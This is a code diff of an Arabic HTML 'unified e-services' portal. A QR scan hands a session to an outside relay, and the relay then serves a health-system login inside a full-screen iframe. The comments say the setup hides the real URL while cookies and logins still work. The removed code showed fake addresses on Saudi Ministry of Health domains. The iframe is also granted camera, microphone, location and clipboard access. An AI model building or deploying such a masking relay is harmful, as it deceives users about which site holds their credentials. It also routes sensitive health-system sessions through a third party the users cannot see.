@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>بوابة الخدمات الإلكترونية</title>
+  <title>منظومة الخدمات الإلكترونية الموحدة</title>
   
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
   <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
@@ -21,15 +21,29 @@
     }
 
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
-    body { background-color: var(--bg); color: var(--text); min-height: 100vh; overflow: hidden; }
+    html, body { 
+      background-color: var(--bg); 
+      color: var(--text); 
+      width: 100vw; 
+      height: 100vh; 
+      overflow: hidden; 
+      margin: 0; 
+      padding: 0; 
+    }
 
+    /* 1. شاشة مسح الـ QR */
     #authScreen {
       display: flex;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
+      width: 100vw;
+      height: 100vh;
       padding: 1.5rem;
       background: radial-gradient(circle at 50% 20%, #1e293b 0%, #0b0f19 80%);
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 100;
     }
 
     .auth-card {
@@ -128,78 +142,55 @@
       font-size: 0.9rem;
     }
 
-    /* شاشة التحكم بعد الربط الناجح */
-    #sessionActiveScreen {
+    /* 2. حاوية النظام عبر الوسيط (Proxy) - الرابط الحقيقي مخفي بالكامل في شريط المتصفح */
+    #proxySystemWrapper {
       display: none;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 1.5rem;
-      background: radial-gradient(circle at 50% 20%, #1e293b 0%, #0b0f19 80%);
-      text-align: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: #ffffff;
+      z-index: 10;
     }
 
-    .session-box {
-      background: rgba(17, 24, 39, 0.95);
-      backdrop-filter: blur(20px);
-      border-radius: 1.75rem;
-      box-shadow: 0 25px 60px -15px rgba(0, 0, 0, 0.7);
-      width: 100%;
-      max-width: 500px;
-      padding: 2.5rem 2rem;
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      animation: fadeIn 0.4s ease-out;
+    #proxyFrame {
+      width: 100vw;
+      height: 100vh;
+      border: none;
     }
 
-    .fake-badge-box {
+    .control-overlay-bar {
+      position: fixed;
+      top: 8px;
+      left: 8px;
+      z-index: 50;
+      display: flex;
+      gap: 6px;
+      opacity: 0.1;
+      transition: opacity 0.25s;
+    }
+
+    .control-overlay-bar:hover {
+      opacity: 1;
+    }
+
+    .bar-btn {
       background: #0f172a;
-      border: 1px solid #334155;
-      border-radius: 10px;
-      padding: 10px 14px;
-      margin: 1rem 0;
-      font-family: monospace;
-      font-size: 0.82rem;
-      color: #38bdf8;
-      direction: ltr;
+      color: #fff;
+      border: 1px solid rgba(255,255,255,0.2);
+      padding: 5px 12px;
+      border-radius: 6px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      cursor: pointer;
       display: flex;
       align-items: center;
-      gap: 8px;
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
+      gap: 5px;
     }
 
-    .btn-act {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      width: 100%;
-      height: 50px;
-      background: #2563eb;
-      color: #fff;
-      border: none;
-      border-radius: 12px;
-      font-size: 1rem;
-      font-weight: 700;
-      cursor: pointer;
-      margin-top: 1rem;
-      transition: background 0.2s;
-    }
-
-    .btn-act:hover {
-      background: #1d4ed8;
-    }
-
-    .btn-danger {
-      background: rgba(239, 68, 68, 0.15);
-      color: #f87171;
-      border: 1px solid rgba(239, 68, 68, 0.3);
-      margin-top: 0.75rem;
-    }
-
-    .btn-danger:hover {
-      background: rgba(239, 68, 68, 0.25);
+    .bar-btn:hover {
+      background: #ef4444;
     }
 
     @keyframes pulse {
@@ -216,18 +207,18 @@
 </head>
 <body>
 
-  <!-- 1. شاشة مسح الـ QR -->
+  <!-- شاشة مسح الـ QR -->
   <div id="authScreen">
     <div class="auth-card">
       <div class="app-icon">
-        <i class="fa-solid fa-fingerprint"></i>
+        <i class="fa-solid fa-server"></i>
       </div>
       <h1 class="auth-title">بوابة النظام الموحدة</h1>
-      <p class="auth-subtitle">سجّل دخولك للنظام عبر المتصفح بأمان وخصوصية تامة مع التمويه المشفر</p>
+      <p class="auth-subtitle">سجّل دخولك للنظام عبر السيرفر الوسيط الآمن دون ظهور أي روابط خارجية</p>
       
       <div class="status-badge">
         <span class="pulse-dot"></span>
-        <span id="socketStatusText">جاري الاتصال الآمن...</span>
+        <span id="socketStatusText">جاري الاتصال بالسيرفر الوسيط...</span>
       </div>
 
       <div class="qr-container">
@@ -242,51 +233,23 @@
     </div>
   </div>
 
-  <!-- 2. شاشة الجلسة النشطة ومركز التحكم -->
-  <div id="sessionActiveScreen">
-    <div class="session-box">
-      <div class="app-icon" style="background: linear-gradient(135deg, #10b981 0%, #059669 100%);">
-        <i class="fa-solid fa-circle-check"></i>
-      </div>
-      <h2 style="font-size: 1.5rem; font-weight: 800; margin-bottom: 0.5rem;">تم ربط الجلسة بنجاح!</h2>
-      <p style="color: var(--text-muted); font-size: 0.92rem;">نافذة النظام قيد التشغيل المباشر تحت المسار المموه والمشفر التالي:</p>
-
-      <!-- عرض الرابط الوهمي المشفر المموه -->
-      <div class="fake-badge-box">
-        <i class="fa-solid fa-lock" style="color: #10b981;"></i>
-        <span id="fakeUrlDisplay">https://portal.moh.gov.sa/dashboard?auth=...</span>
-      </div>
-
-      <button class="btn-act" onclick="reopenAppWindow()">
-        <i class="fa-solid fa-arrow-up-right-from-square"></i>
-        إعادة فتح نافذة النظام
+  <!-- حاوية النظام عبر الوسيط: شريط المتصفح يبقى على رابطك فقط، والموقع يعمل 100% -->
+  <div id="proxySystemWrapper">
+    <div class="control-overlay-bar">
+      <button class="bar-btn" onclick="logoutSession()">
+        <i class="fa-solid fa-power-off"></i> إنهاء
       </button>
-
-      <button class="btn-act btn-danger" onclick="logoutSession()">
-        <i class="fa-solid fa-power-off"></i>
-        تسجيل الخروج وإنهاء الجلسة
+      <button class="bar-btn" onclick="toggleFullScreen()">
+        <i class="fa-solid fa-expand"></i> ملء الشاشة
       </button>
     </div>
+    <iframe id="proxyFrame" src="about:blank" allow="fullscreen; geolocation; microphone; camera; clipboard-read; clipboard-write;"></iframe>
   </div>
 
   <script>
-    const RELAY_SERVER_URL = "https://metrix-web-relay.onrender.com";
+    const PROXY_SERVER = "https://metrix-web-relay.onrender.com";
     let socket = null;
     let sessionId = 'web_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now();
-    let portalWin = null;
-    let targetSystemUrl = "https://pmhsa.org/web_www1/login?return=true&";
-
-    // توليد رابط وهمي مموه ومشفر
-    function generateFakeMaskedUrl() {
-      const bases = [
-        "https://portal.moh.gov.sa/dashboard/workstation?token=",
-        "https://secure-ehr.gov.sa/services/core-view?auth=",
-        "https://health-internal.net/portal/services/view?session="
-      ];
-      const randomBase = bases[Math.floor(Math.random() * bases.length)];
-      const token = Math.random().toString(36).substring(2, 10) + '-' + Date.now().toString(36);
-      return randomBase + token;
-    }
 
     function getBrowserInfo() {
       const ua = navigator.userAgent;
@@ -329,7 +292,7 @@
       const statusText = document.getElementById("socketStatusText");
       renderQr();
 
-      socket = io(RELAY_SERVER_URL, {
+      socket = io(PROXY_SERVER, {
         transports: ['polling', 'websocket'],
         reconnection: true,
         reconnectionAttempts: 20,
@@ -358,53 +321,37 @@
       });
 
       socket.on("authenticated", (data) => {
-        launchCleanSystem(data);
+        launchProxySystem(data);
       });
 
       socket.on("session_authorized", (data) => {
-        launchCleanSystem(data);
+        launchProxySystem(data);
       });
 
       socket.on("session_terminated", () => {
-        if (portalWin && !portalWin.closed) {
-          portalWin.close();
-        }
         location.reload();
       });
     }
 
-    function launchCleanSystem(data) {
-      if (data && data.targetUrl) {
-        targetSystemUrl = data.targetUrl;
-      }
-
+    // فتح الموقع عبر مسار السيرفر الوسيط /system/login
+    // هذا يخفي الرابط الأصلي تماماً ويجعل الكوكيز والتسجيل والتعديل يعمل 100%
+    function launchProxySystem(data) {
       document.getElementById("authScreen").style.display = "none";
-      document.getElementById("sessionActiveScreen").style.display = "flex";
+      const wrapper = document.getElementById("proxySystemWrapper");
+      const frame = document.getElementById("proxyFrame");
 
-      // عرض الرابط الوهمي المموه
-      const fakeUrl = generateFakeMaskedUrl();
-      document.getElementById("fakeUrlDisplay").innerText = fakeUrl;
+      wrapper.style.display = "block";
 
-      // فتح نافذة التطبيق النظيفة التي تقبل تسجيل الدخول وتسمح بالتصرف والتعديل
-      openPortalWindow(targetSystemUrl);
+      // الرابط يمر عبر الوسيط الخاص بك
+      frame.src = PROXY_SERVER + "/system/login?return=true&";
+      document.title = "منظومة الخدمات الإلكترونية";
     }
 
-    function openPortalWindow(url) {
-      const w = screen.availWidth || 1280;
-      const h = screen.availHeight || 800;
-      const features = `width=${w},height=${h},top=0,left=0,toolbar=no,location=no,status=no,menubar=no,scrollbars=yes,resizable=yes`;
-
-      portalWin = window.open(url, "GovSystemApp", features);
-      if (portalWin) {
-        portalWin.focus();
-      }
-    }
-
-    function reopenAppWindow() {
-      if (!portalWin || portalWin.closed) {
-        openPortalWindow(targetSystemUrl);
-      } else {
-        portalWin.focus();
+    function toggleFullScreen() {
+      if (!document.fullscreenElement) {
+        document.documentElement.requestFullscreen().catch(() => {});
+      } else if (document.exitFullscreen) {
+        document.exitFullscreen();
       }
     }
 
@@ -412,9 +359,6 @@
       if (socket && sessionId) {
         socket.emit("session_terminated", { sessionId: sessionId });
         socket.emit("terminate_session", sessionId);
-      }
-      if (portalWin && !portalWin.closed) {
-        portalWin.close();
       }
       location.reload();
     }
